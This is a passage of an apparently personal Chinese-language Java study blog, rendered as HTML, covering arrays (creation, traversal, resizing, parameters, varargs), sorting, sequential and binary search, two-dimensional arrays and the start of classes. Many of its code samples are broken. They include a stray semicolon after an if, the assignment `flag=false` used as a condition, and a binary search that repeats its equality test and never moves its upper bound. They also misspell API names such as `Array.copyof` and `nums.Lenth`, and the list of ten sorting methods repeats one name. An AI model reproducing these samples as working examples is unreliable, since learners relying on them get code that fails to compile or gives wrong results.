class="line">&#125;  </span><br></pre></td></tr></table></figure><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>一组连续的存储空间，存储多个相同数值类型的值</p><p><strong>创建：</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">先声明 再分配空间：</span><br><span class="line">    数据类型[] 数组名；</span><br><span class="line">    数组名=<span class="keyword">new</span> 数据类型[长度]；</span><br><span class="line">    <span class="type">int</span>[] a;</span><br><span class="line">    a=<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">5</span>]<span class="comment">//5表示内存大小为5</span></span><br><span class="line">        </span><br><span class="line">声明并分配空间：</span><br><span class="line">    数据类型[] 数组名=<span class="keyword">new</span> 数据类型[长度]；</span><br><span class="line">    <span class="type">int</span>[] a= <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">5</span>];  </span><br><span class="line"></span><br><span class="line">声明并赋值<span class="number">1</span>：</span><br><span class="line">    数据类型[] 数组名=<span class="keyword">new</span> 数据类型[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;；<span class="comment">//此时[]内不写 </span></span><br><span class="line">    <span class="type">int</span>[] a=<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line"></span><br><span class="line">声明并赋值<span class="number">2</span>：</span><br><span class="line">    数据类型[] 数组名=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;；<span class="comment">//显示初始化 但不能换行</span></span><br><span class="line">    <span class="type">int</span>[] a=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4b0600c7.png" alt="image-20240327113352733"></p><h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><p>遍历：从头至尾，逐一对数组的每个元素进行访问</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span>[] nums=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">            System.out.println(nums[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4b3802f9.png" alt="image-20240327114047818"></p><p><strong>默认值：</strong></p><p>默认值会根据数据类型的不同而改变</p><p>int–&gt;0</p><p>double–&gt;0.0</p><p>boolean–&gt;false</p><p>char–&gt;-\u000  </p><p>其他(引用类型)–&gt;null</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//求平均值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span>[] nums=&#123;<span class="number">8</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">sum += nums[i];</span><br><span class="line">        System.out.println(sum/nums.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//输入一个数 判断是否在数组中</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span>[] nums=&#123;<span class="number">8</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">10</span>&#125;;</span><br><span class="line">Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> input.nextInt;</span><br><span class="line"><span class="type">boolean</span> flag=<span class="literal">false</span><span class="comment">//先默认这个值不存在</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line"><span class="keyword">if</span>(nums[i]==num);&#123;</span><br><span class="line">System.out.println(i);</span><br><span class="line">    flag=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag=<span class="literal">false</span>)&#123;</span><br><span class="line">System.out.println(<span class="number">666</span>);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="扩容"><a href="#扩容" class="headerlink" title="扩容"></a>扩容</h3><p>length属性是只读权限 不能赋值</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ae6ea1f.png" alt="image-20240403105542687"></p><p>所以扩容就是创建一个新数组然后把旧数组的值重新传进来</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//数组的扩容</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span>[] nums=&#123;<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>,<span class="number">55</span>&#125;;</span><br><span class="line"><span class="type">int</span>[] newNums=<span class="keyword">new</span> <span class="title class_">int</span>[nums.length*<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">newNums[i]=nums[i];<span class="comment">//将nums中的值赋给newNums</span></span><br><span class="line">    &#125;</span><br><span class="line">        nums=newNums;</span><br><span class="line">System.out.println(Arrays.toString(nums))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>nums&#x3D;newNums;</p><p>因为数组是引用类型，所以在声明数组时会在堆中开辟一段空间 将nums的地址指向这个堆空间</p><p>而将nums&#x3D;newNums;此时是进行栈操作，将nums的地址指向newNums的堆空间 进而实现数组的拓展</p></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641a4ad00c87.png" alt="image-20240403110950666"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4af60c93.png" alt="image-20240403111435499"></p><p>复制的方法：<br><img src="https://bu.dusays.com/2024/05/13/6641a4ae83cbc.png" alt="image-20240403111043343"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//数组的扩容</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        nums=Array.copyof(nums,nums.length*<span class="number">2</span>);</span><br><span class="line"><span class="comment">//要调用这个拓展了的数组 因为它是以返回值的形式返回</span></span><br><span class="line">System.out.println(Arrays.toString(nums))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数组型参数与返回值"><a href="#数组型参数与返回值" class="headerlink" title="数组型参数与返回值"></a>数组型参数与返回值</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span>[] nums=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">add(nums);</span><br><span class="line">System.out.println(Arrays.toString(nums))</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>[] nums)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">nums[i]+=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出2，3，4，5，6，7</span></span><br></pre></td></tr></table></figure><p>因为这里当数组作为一个参数时，方法会获取他<strong>堆地址进行操作</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span>[] nums=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line"><span class="comment">//add(nums);</span></span><br><span class="line"><span class="comment">//System.out.println(Arrays.toString(nums))</span></span><br><span class="line">        expand(nums);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">expand</span><span class="params">(<span class="type">int</span>[] nums)</span>&#123;</span><br><span class="line">nums=Arrays.copyof(nums,nums.Lenth*<span class="number">2</span>);</span><br><span class="line">System.out.println(Array.toString(nums));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>[] nums)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">nums[i]+=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//此时会输出已扩展的nums</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span>[] nums=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line"><span class="comment">//add(nums);</span></span><br><span class="line"><span class="comment">//System.out.println(Arrays.toString(nums))</span></span><br><span class="line">        expand(nums);</span><br><span class="line">        System.out.println(Array.toString(nums));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">expand</span><span class="params">(<span class="type">int</span>[] nums)</span>&#123;</span><br><span class="line">nums=Arrays.copyof(nums,nums.Lenth*<span class="number">2</span>);</span><br><span class="line"><span class="comment">//System.out.println(Array.toString(nums));</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>[] nums)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">nums[i]+=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//此时会输出为扩展的nums</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//因为expand方法中有一个形参-&gt;nums 但这其实不是nums数组，形参是互补影响的，所以这里其实是在调用expand方法时，会在堆中重新开辟一段空间，此时形参nums(叫其他的也是一样的)的地址会指向nums数组的堆地址，赋值到形参的地址，扩容，但在调用完成后会销毁这个地址（因为没用），所以如果查看nums数组时，会仍指向原地址，就没扩容</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//解决</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span>[] nums=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line"><span class="comment">//add(nums);</span></span><br><span class="line"><span class="comment">//System.out.println(Arrays.toString(nums))</span></span><br><span class="line">        nums=expand(nums);<span class="comment">//接收</span></span><br><span class="line">        System.out.println(Array.toString(nums));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] expand(<span class="type">int</span>[] nums)&#123;<span class="comment">//将返回值类型改为数组</span></span><br><span class="line">nums=Arrays.copyof(nums,nums.Lenth*<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> nums;<span class="comment">//返回地址</span></span><br><span class="line"><span class="comment">//System.out.println(Array.toString(nums));</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>[] nums)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">nums[i]+=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可变长参数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">       add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>...nums)</span>&#123;</span><br><span class="line"><span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">nums[i]+=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(sum);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可变长参数其实就是未封装的数组</p><p>但可变长参数只能在<strong>最后一个形参处</strong>调用</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b42e56e.png" alt="image-20240403114621699"></p><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><p>排序的目的是为了方便数据的查找</p><p>有10种排序方法</p><blockquote><p>冒泡排序  选择排序  插入排序    n*n</p><p>快速排序  堆排序    希尔排序  归并排序     n*log2n</p><p>桶排序    计数排序  计数排序</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//冒泡排序：相邻的两个数值比较大小 互换位置</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"><span class="type">int</span>[] nums = &#123;<span class="number">3</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">56</span>,<span class="number">84</span>,<span class="number">24</span>,<span class="number">12</span>,<span class="number">8</span>&#125;;</span><br><span class="line">bubbleSort(nums);</span><br><span class="line">System.out.println(Array.toString(nums));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bubbleSort</span><span class="params">(<span class="type">int</span>[] nums)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length-<span class="number">1</span>;i++)&#123;<span class="comment">//外层循环控制轮数</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;nums.length-<span class="number">1</span>-i;j++)&#123;<span class="comment">//内层循环控制每轮比较次数  比过的就不用再比了</span></span><br><span class="line"><span class="comment">//相邻比较 交换顺序</span></span><br><span class="line"><span class="keyword">if</span>(nums[j]&lt;nums[j+<span class="number">1</span>])&#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> nums[j];</span><br><span class="line">nums[j]= nums[j+<span class="number">1</span>];</span><br><span class="line">nums[j+<span class="number">1</span>]=temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//选择排序：固定值与其他值依次比大小，互换位置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//jdk排序</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"><span class="type">int</span>[] nums = &#123;<span class="number">3</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">56</span>,<span class="number">84</span>,<span class="number">24</span>,<span class="number">12</span>,<span class="number">8</span>&#125;;</span><br><span class="line">Arrays.sort(nums);<span class="comment">//默认升序排序</span></span><br><span class="line">System.out.println(Array.toString(nums));</span><br><span class="line">&#125;</span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//计数排序 用于特定环境 连续区间</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"><span class="type">int</span>[] nums = &#123;<span class="number">1</span>，<span class="number">2</span>，<span class="number">4</span>，<span class="number">3</span>，<span class="number">2</span>，<span class="number">4</span>，<span class="number">1</span>，<span class="number">3</span>，<span class="number">4</span>，<span class="number">2</span>&#125;;</span><br><span class="line"><span class="comment">//&#123;2，3，2，3&#125;描述数组 2个1 3个2 2个3 3个4</span></span><br><span class="line"><span class="comment">//&#123;1，1，2，2，2，3，3，4，4，4&#125;排序</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span>[] counts=<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">4</span>];<span class="comment">//&#123;0,0,0,0&#125;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;<span class="comment">//描述数组构建</span></span><br><span class="line">counts[nums[i]-<span class="number">1</span>]++;<span class="comment">//映射赋值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span>[] newNums=<span class="keyword">new</span> <span class="title class_">int</span>[nums.length];</span><br><span class="line"><span class="type">int</span> index=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;counts.length;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;counts[i];j++)&#123;</span><br><span class="line"><span class="comment">//还原数组</span></span><br><span class="line">newNums[index++]=i+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">nums=newNums;</span><br><span class="line">System.out.println(Arrays.toString(nums));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"><span class="type">int</span>[] nums = &#123;<span class="number">1</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">35</span>,<span class="number">48</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> index=getNum(nums,num);</span><br><span class="line">System.out.println(index);</span><br><span class="line"></span><br><span class="line">Array.sort(nums);</span><br><span class="line"><span class="type">int</span> index=binarySearch(nums,num);</span><br><span class="line"><span class="comment">//也可以直接 int index=Array.binarySearch(nums,num);</span></span><br><span class="line">System.out.println(index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//顺序查找 一个一个找</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getNum</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> num)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(nums[i]==num)&#123;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//二分查找 一半一半找 前提是数据有序的</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">binarySearch</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> num)</span>&#123;</span><br><span class="line"><span class="type">int</span> begin=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> end=nums.length-<span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> mid;</span><br><span class="line"><span class="keyword">while</span>(begin&lt;=end)&#123;</span><br><span class="line">mid=(begin+end)/<span class="number">2</span> <span class="comment">//取中点下标</span></span><br><span class="line"><span class="keyword">if</span>(nums[mid]==num)&#123;</span><br><span class="line"><span class="keyword">return</span> mid;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid]==num)&#123;<span class="comment">//说明查找元素再前半部分</span></span><br><span class="line"><span class="comment">//end 前移</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//begin 后移</span></span><br><span class="line">begin=mid+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h3><p>概念：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b7ca921.png" alt="image-20240408094100540"></p><p>赋值：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b4d363d.png" alt="image-20240408094336997"></p><p>内存分配</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b312822.png" alt="image-20240408094458848"></p><p>访问：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b562afa.png" alt="image-20240408094607893"></p><p>声明：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b2e835e.png" alt="image-20240408094741389"></p><p><strong>高维长度是必要的 低维长度可要可不要</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"><span class="type">int</span>[][]nums=&#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;,&#123;<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums,length;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;nums[i].length;j++)&#123;</span><br><span class="line">System.out.println(nums[i][j]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//杨辉三角</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"><span class="type">int</span>[][]nums=<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>][];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">nums[i]=<span class="keyword">new</span> <span class="title class_">int</span>[i+<span class="number">1</span>];</span><br><span class="line">nums[i][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">nums[i][i]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;nums[i].length-<span class="number">1</span>;j++)&#123;</span><br><span class="line">nums[i][j]=nums[i-<span class="number">1</span>][j-<span class="number">1</span>]+nums[i-<span class="number">1</span>][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums,length;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;nums[i].length;j++)&#123;</span><br><span class="line">System.out.println(nums[i][j]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4af9e5e9.png" alt="image-20240410102648801"></p><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b494bde.png" alt="image-20240410103759344"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span>&#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">String brand;<span class="comment">//品种</span></span><br><span class="line">String name;</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line">String color;</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(name+<span class="string">&quot;eating&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(name+<span class="string">&quot;sleeping&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//另一个包实例化对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">Dog dog=<span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">dog.brand=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">dog.name=<span class="string">&quot;2&quot;</span>;</span><br><span class="line">dog.age=<span 